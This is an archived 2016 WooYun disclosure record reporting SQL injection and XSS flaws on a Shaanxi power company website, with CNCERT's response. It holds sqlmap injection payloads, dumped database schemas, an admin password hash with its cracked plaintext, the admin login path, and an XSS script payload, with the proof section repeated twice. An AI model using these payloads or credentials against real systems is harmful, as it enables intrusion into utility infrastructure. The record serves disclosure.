{"id": 75630, "wybug_id": "wooyun-2016-0166922", "wybug_title": "陕西地方电力公司存在多处高危漏洞（sql注入／XSS）", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "dloved", "wybug_date": "2016-01-04 22:46", "wybug_open_date": "2016-02-20 15:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["管理后台对外", "漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-20：\t细节向公众公开  简要描述： 陕西地方电力公司存在sql注入漏洞，由于技术原因，未拿到后台权限，但风险还是比较大的。 详细说明：  Sql注入：http://**.**.**.**/info_page.jsp?plmjc=zgpdw http://**.**.**.**/qywh.jsp?plmjc=qywh http://**.**.**.**/zt_page.jsp?lmmc=zt_ddby \n\n 漏洞验证：http://**.**.**.**/info_page.jsp?plmjc=zgpdw sqlmap identified the following injection points with a total of 105 HTTP(s) requests:---Place: GETParameter: plmjc    Type: UNION query    Title: MySQL UNION query (NULL) - 7 columns    Payload: plmjc=zgpdw' UNION ALL SELECT 17,17,17,CONCAT(0x716d6b7371,0x6647447058624f496777,0x7174787971),17,17,17#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: plmjc=zgpdw' AND SLEEP(5) AND 'IdrT'='IdrT---web application technology: JSPback-end DBMS: MySQL 5.0.11sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: plmjc    Type: UNION query    Title: MySQL UNION query (NULL) - 7 columns    Payload: plmjc=zgpdw' UNION ALL SELECT 17,17,17,CONCAT(0x716d6b7371,0x6647447058624f496777,0x7174787971),17,17,17#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: plmjc=zgpdw' AND SLEEP(5) AND 'IdrT'='IdrT---web application technology: JSPback-end DBMS: MySQL 5.0.11Database: wzht[40 tables]+---------------------------------------+| user                                  || admin                                 || answer                                || config                                || czqx                                  || dc                                    || dcip                                  || dcxx                                  || exame                                 || fengge                                || guanggao                              || guestbook                             || jianjie                               || jsqx                                  || jsym                                  || liuyanban                             || lm                                    || lockip                                || mk                                    || nygqxx                                || nyhy                                  || options                               || pic                                   || question                              || rz                                    || shipin                                || tj                                    || wsjb                                  || wsly_yltd                             || xfhf                                  || xflx                                  || xtjs                                  || xtyh                                  || xw                                    || yaocai                                || yhjs                                  || ymb                                   || yqlj                                  || zygqxx                                || zyhy                                  |+---------------------------------------+Database: information_schema[28 tables]+---------------------------------------+| CHARACTER_SETS                        || COLLATIONS                            || COLLATION_CHARACTER_SET_APPLICABILITY || COLUMNS                               || COLUMN_PRIVILEGES                     || ENGINES                               || EVENTS                                || FILES                                 || GLOBAL_STATUS                         || GLOBAL_VARIABLES                      || KEY_COLUMN_USAGE                      || PARTITIONS                            || PLUGINS                               || PROCESSLIST                           || PROFILING                             || REFERENTIAL_CONSTRAINTS               || ROUTINES                              || SCHEMATA                              || SCHEMA_PRIVILEGES                     || SESSION_STATUS                        || SESSION_VARIABLES                     || STATISTICS                            || TABLES                                || TABLE_CONSTRAINTS                     || TABLE_PRIVILEGES                      || TRIGGERS                              || USER_PRIVILEGES                       || VIEWS                                 |+---------------------------------------+Database: mysql[23 tables]+---------------------------------------+| user                                  || columns_priv                          || db                                    || event                                 || func                                  || general_log                           || help_category                         || help_keyword                          || help_relation                         || help_topic                            || host                                  || ndb_binlog_index                      || plugin                                || proc                                  || procs_priv                            || servers                               || slow_log                              || tables_priv                           || time_zone                             || time_zone_leap_second                 || time_zone_name                        || time_zone_transition                  || time_zone_transition_type             |+---------------------------------------+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: plmjc    Type: UNION query    Title: MySQL UNION query (NULL) - 7 columns    Payload: plmjc=zgpdw' UNION ALL SELECT 17,17,17,CONCAT(0x716d6b7371,0x6647447058624f496777,0x7174787971),17,17,17#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: plmjc=zgpdw' AND SLEEP(5) AND 'IdrT'='IdrT---web application technology: JSPback-end DBMS: MySQL 5.0.11Database: wzhtTable: admin[11 columns]+---------------+-------------+| Column        | Type        |+---------------+-------------+| User          | varchar(32) || AdminAddress  | varchar(50) || AdminHomePage | varchar(40) || AdminID       | int(11)     || AdminMail     | varchar(40) || AdminName     | varchar(20) || AdminNote     | longtext    || AdminPhone    | varchar(12) || AdminQQ       | varchar(10) || AdminUid      | varchar(20) || Pwd           | varchar(32) |+---------------+-------------+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: plmjc    Type: UNION query    Title: MySQL UNION query (NULL) - 7 columns    Payload: plmjc=zgpdw' UNION ALL SELECT 17,17,17,CONCAT(0x716d6b7371,0x6647447058624f496777,0x7174787971),17,17,17#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: plmjc=zgpdw' AND SLEEP(5) AND 'IdrT'='IdrT---web application technology: JSPback-end DBMS: MySQL 5.0.11sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: plmjc    Type: UNION query    Title: MySQL UNION query (NULL) - 7 columns    Payload: plmjc=zgpdw' UNION ALL SELECT 17,17,17,CONCAT(0x716d6b7371,0x6647447058624f496777,0x7174787971),17,17,17#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: plmjc=zgpdw' AND SLEEP(5) AND 'IdrT'='IdrT---web application technology: JSPback-end DBMS: MySQL 5.0.11sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: plmjc    Type: UNION query    Title: MySQL UNION query (NULL) - 7 columns    Payload: plmjc=zgpdw' UNION ALL SELECT 17,17,17,CONCAT(0x716d6b7371,0x6647447058624f496777,0x7174787971),17,17,17#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: plmjc=zgpdw' AND SLEEP(5) AND 'IdrT'='IdrT---web application technology: JSPback-end DBMS: MySQL 5.0.11sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: plmjc    Type: UNION query    Title: MySQL UNION query (NULL) - 7 columns    Payload: plmjc=zgpdw' UNION ALL SELECT 17,17,17,CONCAT(0x716d6b7371,0x6647447058624f496777,0x7174787971),17,17,17#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: plmjc=zgpdw' AND SLEEP(5) AND 'IdrT'='IdrT---web application technology: JSPback-end DBMS: MySQL 5.0.11sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: plmjc    Type: UNION query    Title: MySQL UNION query (NULL) - 7 columns    Payload: plmjc=zgpdw' UNION ALL SELECT 17,17,17,CONCAT(0x716d6b7371,0x6647447058624f496777,0x7174787971),17,17,17#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: plmjc=zgpdw' AND SLEEP(5) AND 'IdrT'='IdrT---web application technology: JSPback-end DBMS: MySQL 5.0.11Database: wzhtTable: admin[1 entry]+-----------------+----------------------------------+-----------------+| AdminUid        | Pwd                              | AdminName       |+-----------------+----------------------------------+-----------------+| ???Ą\\xc2?????Ąč | 8FB4338242D1CCEBE6E25064DCACEA9B | ???Ą\\xc2?????Ąč |+-----------------+----------------------------------+-----------------+Adminname未被破解出来Pwd破解后密码为：d91034网站后台地址为http://**.**.**.**/wzht/loginAction.do ，账号破解出来后就可以登录。 以上证明由于技术原因未拿到权限，但足可以证明该网站存在sql注入漏洞，希望可以为山西地方电力局发现风险并整改Xss漏洞：http://**.**.**.**:80/info_3dt.jsp?http://**.**.**.**:80/info_3dt.jsphttp://**.**.**.**:80/info_4dt.jsphttp://**.**.**.**:80/info_pagelist.jsphttp://**.**.**.**:80/qywh.jsp  以上均存在Xss漏洞证明：http://**.**.**.**:80/info_3dt.jsp?lm=dd_bjfgs'%22()%26%25<acx><ScRiPt%20>prompt(919045)</ScRiPt>\n\n还有其他的，建议自行进行渗透测试。。。   漏洞证明：  Sql注入：http://**.**.**.**/info_pagelist.jsp?page=1&lmmc=dd_gpwh&plmjc=qywh http://**.**.**.**/qywh.jsp?plmjc=qywh http://**.**.**.**/zt_page.jsp?lmmc=zt_ddby \n\n 漏洞验证：http://**.**.**.**/info_page.jsp?plmjc=zgpdw sqlmap identified the following injection points with a total of 105 HTTP(s) requests:---Place: GETParameter: plmjc    Type: UNION query    Title: MySQL UNION query (NULL) - 7 columns    Payload: plmjc=zgpdw' UNION ALL SELECT 17,17,17,CONCAT(0x716d6b7371,0x6647447058624f496777,0x7174787971),17,17,17#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: plmjc=zgpdw' AND SLEEP(5) AND 'IdrT'='IdrT---web application technology: JSPback-end DBMS: MySQL 5.0.11sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: plmjc    Type: UNION query    Title: MySQL UNION query (NULL) - 7 columns    Payload: plmjc=zgpdw' UNION ALL SELECT 17,17,17,CONCAT(0x716d6b7371,0x6647447058624f496777,0x7174787971),17,17,17#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: plmjc=zgpdw' AND SLEEP(5) AND 'IdrT'='IdrT---web application technology: JSPback-end DBMS: MySQL 5.0.11Database: wzht[40 tables]+---------------------------------------+| user                                  || admin                                 || answer                                || config                                || czqx                                  || dc                                    || dcip                                  || dcxx                                  || exame                                 || fengge                                || guanggao                              || guestbook                             || jianjie                               || jsqx                                  || jsym                                  || liuyanban                             || lm                                    || lockip                                || mk                                    || nygqxx                                || nyhy                                  || options                               || pic                                   || question                              || rz                                    || shipin                                || tj                                    || wsjb                                  || wsly_yltd                             || xfhf                                  || xflx                                  || xtjs                                  || xtyh                                  || xw                                    || yaocai                                || yhjs                                  || ymb                                   || yqlj                                  || zygqxx                                || zyhy                                  |+---------------------------------------+Database: information_schema[28 tables]+---------------------------------------+| CHARACTER_SETS                        || COLLATIONS                            || COLLATION_CHARACTER_SET_APPLICABILITY || COLUMNS                               || COLUMN_PRIVILEGES                     || ENGINES                               || EVENTS                                || FILES                                 || GLOBAL_STATUS                         || GLOBAL_VARIABLES                      || KEY_COLUMN_USAGE                      || PARTITIONS                            || PLUGINS                               || PROCESSLIST                           || PROFILING                             || REFERENTIAL_CONSTRAINTS               || ROUTINES                              || SCHEMATA                              || SCHEMA_PRIVILEGES                     || SESSION_STATUS                        || SESSION_VARIABLES                     || STATISTICS                            || TABLES                                || TABLE_CONSTRAINTS                     || TABLE_PRIVILEGES                      || TRIGGERS                              || USER_PRIVILEGES                       || VIEWS                                 |+---------------------------------------+Database: mysql[23 tables]+---------------------------------------+| user                                  || columns_priv                          || db                                    || event                                 || func                                  || general_log                           || help_category                         || help_keyword                          || help_relation                         || help_topic                            || host                                  || ndb_binlog_index                      || plugin                                || proc                                  || procs_priv                            || servers                               || slow_log                              || tables_priv                           || time_zone                             || time_zone_leap_second                 || time_zone_name                        || time_zone_transition                  || time_zone_transition_type             |+---------------------------------------+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: plmjc    Type: UNION query    Title: MySQL UNION query (NULL) - 7 columns    Payload: plmjc=zgpdw' UNION ALL SELECT 17,17,17,CONCAT(0x716d6b7371,0x6647447058624f496777,0x7174787971),17,17,17#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: plmjc=zgpdw' AND SLEEP(5) AND 'IdrT'='IdrT---web application technology: JSPback-end DBMS: MySQL 5.0.11Database: wzhtTable: admin[11 columns]+---------------+-------------+| Column        | Type        |+---------------+-------------+| User          | varchar(32) || AdminAddress  | varchar(50) || AdminHomePage | varchar(40) || AdminID       | int(11)     || AdminMail     | varchar(40) || AdminName     | varchar(20) || AdminNote     | longtext    || AdminPhone    | varchar(12) || AdminQQ       | varchar(10) || AdminUid      | varchar(20) || Pwd           | varchar(32) |+---------------+-------------+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: plmjc    Type: UNION query    Title: MySQL UNION query (NULL) - 7 columns    Payload: plmjc=zgpdw' UNION ALL SELECT 17,17,17,CONCAT(0x716d6b7371,0x6647447058624f496777,0x7174787971),17,17,17#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: plmjc=zgpdw' AND SLEEP(5) AND 'IdrT'='IdrT---web application technology: JSPback-end DBMS: MySQL 5.0.11sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: plmjc    Type: UNION query    Title: MySQL UNION query (NULL) - 7 columns    Payload: plmjc=zgpdw' UNION ALL SELECT 17,17,17,CONCAT(0x716d6b7371,0x6647447058624f496777,0x7174787971),17,17,17#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: plmjc=zgpdw' AND SLEEP(5) AND 'IdrT'='IdrT---web application technology: JSPback-end DBMS: MySQL 5.0.11sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: plmjc    Type: UNION query    Title: MySQL UNION query (NULL) - 7 columns    Payload: plmjc=zgpdw' UNION ALL SELECT 17,17,17,CONCAT(0x716d6b7371,0x6647447058624f496777,0x7174787971),17,17,17#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: plmjc=zgpdw' AND SLEEP(5) AND 'IdrT'='IdrT---web application technology: JSPback-end DBMS: MySQL 5.0.11sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: plmjc    Type: UNION query    Title: MySQL UNION query (NULL) - 7 columns    Payload: plmjc=zgpdw' UNION ALL SELECT 17,17,17,CONCAT(0x716d6b7371,0x6647447058624f496777,0x7174787971),17,17,17#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: plmjc=zgpdw' AND SLEEP(5) AND 'IdrT'='IdrT---web application technology: JSPback-end DBMS: MySQL 5.0.11sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: plmjc    Type: UNION query    Title: MySQL UNION query (NULL) - 7 columns    Payload: plmjc=zgpdw' UNION ALL SELECT 17,17,17,CONCAT(0x716d6b7371,0x6647447058624f496777,0x7174787971),17,17,17#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: plmjc=zgpdw' AND SLEEP(5) AND 'IdrT'='IdrT---web application technology: JSPback-end DBMS: MySQL 5.0.11Database: wzhtTable: admin[1 entry]+-----------------+----------------------------------+-----------------+| AdminUid        | Pwd                              | AdminName       |+-----------------+----------------------------------+-----------------+| ???Ą\\xc2?????Ąč | 8FB4338242D1CCEBE6E25064DCACEA9B | ???Ą\\xc2?????Ąč |+-----------------+----------------------------------+-----------------+Adminname未被破解出来Pwd破解后密码为：d91034网站后台地址为http://**.**.**.**/wzht/loginAction.do ，账号破解出来后就可以登录。 以上证明由于技术原因未拿到权限，但足可以证明该网站存在sql注入漏洞，希望可以为山西地方电力局发现风险并整改Xss漏洞：http://**.**.**.**:80/info_3dt.jsp?http://**.**.**.**:80/info_3dt.jsphttp://**.**.**.**:80/info_4dt.jsphttp://**.**.**.**:80/info_pagelist.jsphttp://**.**.**.**:80/qywh.jsp  以上均存在Xss漏洞证明：http://**.**.**.**:80/info_3dt.jsp?lm=dd_bjfgs'%22()%26%25<acx><ScRiPt%20>prompt(919045)</ScRiPt>\n\n还有其他的，建议自行进行渗透测试。。。   修复方案：  建议进行参数和特殊字符过滤；   版权声明：转载请注明来源 dloved@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2016-01-08 18:08 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT向能源行业信息化主管部门通报,并抄报陕西分中心协助处置,由其后续协调网站管理单位处置.  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}